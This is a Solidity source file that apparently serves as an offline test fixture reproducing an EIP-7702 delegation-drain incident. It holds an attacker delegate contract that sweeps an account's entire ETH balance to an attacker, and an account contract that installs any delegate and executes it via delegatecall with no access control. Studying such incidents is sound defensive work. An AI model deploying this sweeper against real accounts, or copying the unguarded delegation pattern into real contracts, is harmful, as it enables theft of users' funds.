// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// Minimized OFFLINE reproduction of the sven.eth EIP-7702 delegation drain (2026-10-14, ~9.12 ETH
// + 1.69 TAPEETH, ~$22.7K, Ethereum). Authored in THIS repo (MIT). This is NOT a copy of the
// on-chain malicious delegate bytecode and NOT a copy of any third-party PoC. The documented
// MECHANISM is reproduced from authoritative write-ups; see ./sven-eth-victim/PROVENANCE.md for the
// incident facts (victim EOA, malicious delegate, pinned type-4 tx hash, on-chain verification,
// sources).
//
// Root cause (per crypto.news / Cryptotimes / ExVul): the victim's EOA signed an EIP-7702 SET_CODE
// (type-4) authorization delegating the account's code to an attacker-controlled delegate contract.
// An attacker-controlled sponsor then submitted the sponsored type-4 transaction carrying that
// authorization, so the delegate's logic ran IN THE ACCOUNT'S OWN CONTEXT and swept the account's
// ETH (and tokens) to the attacker in one shot. No per-asset approval was needed - the single
// delegation handed over the whole account.
//
// As elsewhere in this corpus, the "code runs as the account" semantics is modeled EXPLICITLY via
// delegatecall (no vm.signDelegation dependency) so the fixture is deterministic on any toolchain.

/// @title SvenSweeperDelegate - the attacker's EIP-7702 delegate.
/// @notice When installed as the account's delegate and activated, this runs in the account's
///         context (`address(this)` is the account) and moves the account's ENTIRE ETH balance to
///         the attacker in one call.
contract SvenSweeperDelegate {
    function sweepEth(address payable attacker) external {
        (bool ok,) = attacker.call{value: address(this).balance}("");
        require(ok, "sweep-failed");
    }
}

/// @title SvenVulnerableAccount - an EOA that accepts ANY EIP-7702 delegation.
/// @notice No delegation policy: it installs whatever delegate a (phished / maliciously sponsored)
///         authorization names and then runs it in its own context. The victim is drained on the
///         first activation.
contract SvenVulnerableAccount {
    address public delegate;

    function installDelegation(address delegate_) external {
        delegate = delegate_;
    }

    /// @dev Activate the delegate in this account's context (delegatecall models 7702 "run delegate
    ///      code as the account"). Invokable by the sponsor/attacker.
    function activate(bytes calldata data) external returns (bytes memory) {
        require(delegate != address(0), "no delegation");
        (bool ok, bytes memory ret) = delegate.delegatecall(data);
        require(ok, "delegate execution failed");
        return ret;
    }

    receive() external payable {}
}
